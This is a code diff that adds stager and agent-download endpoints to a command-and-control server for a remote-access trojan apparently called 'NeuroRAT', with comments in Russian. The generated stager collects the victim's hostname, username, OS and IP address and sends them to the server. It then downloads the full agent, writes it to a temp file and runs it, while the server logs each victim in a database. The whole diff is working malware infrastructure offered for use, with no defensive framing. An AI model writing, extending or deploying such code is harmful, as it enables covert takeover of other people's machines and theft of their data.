@@ -1249,5 +1249,134 @@ satan_html = """
 with open("templates/satan.html", "w") as f:
     f.write(satan_html)
 
+# Добавляем маршруты для загрузки агентов и стейджеров
+@app.route('/api/download/agent', methods=['POST'])
+def download_agent():
+    """Endpoint для загрузки основного агента"""
+    try:
+        agent_id = request.headers.get('Agent-ID')
+        if not agent_id:
+            agent_id = str(uuid.uuid4())[:8]
+        
+        # Получаем системную информацию от клиента
+        system_info = request.form.get('system_info', '{}')
+        logger.info(f"Запрос на загрузку агента от {agent_id}. Системная информация: {system_info}")
+        
+        # Загружаем исходный код агента
+        agent_path = os.path.join(os.path.dirname(__file__), "neurorat_agent.py")
+        with open(agent_path, 'rb') as f:
+            agent_code = f.read()
+        
+        # Регистрируем нового агента в БД
+        db.execute(
+            "INSERT OR REPLACE INTO agents (agent_id, ip_address, status, system_info, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
+            (agent_id, request.remote_addr, "downloading", system_info, int(time.time()), int(time.time()))
+        )
+        db.commit()
+        
+        # Логируем событие
+        log_event("agent_download", f"Агент {agent_id} загрузил основной модуль с {request.remote_addr}")
+        
+        return agent_code
+    except Exception as e:
+        logger.error(f"Ошибка при загрузке агента: {str(e)}")
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/api/download/stager', methods=['GET'])
+def download_stager():
+    """Endpoint для загрузки минимального стейджера"""
+    try:
+        # Идентификатор для логирования
+        request_id = str(uuid.uuid4())[:8]
+        logger.info(f"Запрос на загрузку стейджера от {request.remote_addr} (ID: {request_id})")
+        
+        # Создаем минимальный стейджер для загрузки полного агента
+        stager_code = f"""# NeuroRAT Stager
+import os
+import sys
+import time
+import socket
+import platform
+import uuid
+import base64
+import urllib.request
+
+# Используем настройки по умолчанию для сервера
+SERVER_HOST = "{request.host.split(':')[0]}"
+SERVER_PORT = {DEFAULT_PORT}
+
+# Генерируем уникальный идентификатор агента
+agent_id = str(uuid.uuid4())[:8]
+
+# Собираем информацию о системе
+def get_system_info():
+    info = {{
+        "os": platform.system(),
+        "hostname": socket.gethostname(),
+        "username": os.getenv("USER") or os.getenv("USERNAME"),
+        "processor": platform.processor(),
+        "python_version": platform.python_version()
+    }}
+    
+    # Получаем IP адрес
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        info["ip_address"] = s.getsockname()[0]
+        s.close()
+    except:
+        info["ip_address"] = "127.0.0.1"
+    
+    return info
+
+# Загружаем и запускаем основного агента
+try:
+    # Формируем URL для загрузки агента
+    url = f"http://{{SERVER_HOST}}:{{SERVER_PORT}}/api/download/agent"
+    
+    # Создаем POST-запрос с системной информацией
+    data = urllib.parse.urlencode({{"system_info": str(get_system_info())}}).encode()
+    
+    # Устанавливаем заголовок с идентификатором агента
+    headers = {{"Agent-ID": agent_id}}
+    
+    # Отправляем запрос
+    req = urllib.request.Request(url, data=data, headers=headers)
+    response = urllib.request.urlopen(req)
+    
+    # Получаем код агента
+    agent_code = response.read()
+    
+    # Сохраняем во временный файл
+    import tempfile
+    temp_dir = tempfile.gettempdir()
+    agent_path = os.path.join(temp_dir, f"agent_{{agent_id}}.py")
+    
+    with open(agent_path, "wb") as f:
+        f.write(agent_code)
+    
+    # Запускаем агента с параметрами
+    import subprocess
+    subprocess.Popen([
+        sys.executable, 
+        agent_path,
+        "--server", SERVER_HOST,
+        "--port", str(SERVER_PORT),
+        "--agent-id", agent_id
+    ])
+    
+except Exception as e:
+    # При ошибке пытаемся повторить через некоторое время
+    time.sleep(30)
+"""
+        
+        # Логируем событие
+        log_event("stager_download", f"Стейджер загружен с {request.remote_addr} (ID: {request_id})")
+        
+        return stager_code
+    except Exception as e:
+        logger.error(f"Ошибка при загрузке стейджера: {str(e)}")
+        return jsonify({"error": str(e)}), 500
+
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8080) 
